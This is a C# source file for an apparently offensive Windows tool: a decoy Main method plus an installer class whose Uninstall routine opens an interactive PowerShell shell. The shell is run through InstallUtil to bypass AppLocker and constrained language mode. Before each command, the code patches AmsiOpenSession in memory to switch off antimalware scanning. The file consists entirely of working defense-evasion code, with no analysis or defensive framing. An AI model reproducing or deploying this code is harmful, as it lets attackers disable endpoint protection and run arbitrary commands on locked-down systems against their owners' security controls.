using System;
using System.ComponentModel;
using System.IO;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;

namespace ConstrainedLocker {
    internal class Program {
        static void Main(string[] args) {
            // Decoy procedure
            Console.WriteLine("\n[i] Main method decoy content");
        }
    }
}

[RunInstallerAttribute(true)]
public class AppLockerUninstall : System.Configuration.Install.Installer {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    void patchSession() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiOpenSession");
        if (addr == IntPtr.Zero) {
            Console.WriteLine("\n[!] Could not retrieve OpenSession function pointer.");
        }

        uint oldProt = 0;
        if (!VirtualProtect(addr, (UIntPtr)3, 0x40, out oldProt)) {
            Console.WriteLine("\n[!] Could not modify memory permissions.");
            return;
        }

        byte[] patch = {0x48, 0x31, 0xC0};
        try {
            Marshal.Copy(patch, 0, addr, 3);
        }catch (Exception e) {
            Console.WriteLine($"\n[!] Unexpected error: {e.Message}");
            return;
        }
    }

    public override void Uninstall(System.Collections.IDictionary savedState) {
        // Create a PS runspace and open it
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();

        while (true) {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("PS >_ ");
            Console.ResetColor();
            String input = Console.ReadLine();

            if (input.ToLower() == "exit") {
                break;
            }

            try {
                // Create a pipeline for running the commands
                Pipeline pipeline = rs.CreatePipeline();

                // Patch AMSI and add provided command to the pipeline
                patchSession();
                pipeline.Commands.AddScript(input);

                // Execute the command and store results
                var results = pipeline.Invoke();

                // Write results to the screen
                foreach (var result in results) {
                    Console.WriteLine(result);
                }

                // Close the file and dispose of the pipeline
                pipeline.Dispose();
            }catch (Exception e) {
                Console.WriteLine($"\n[!] Unexpected error: {e.Message}");
            }
        }

        // Close runspace
        rs.Close();
    }
}
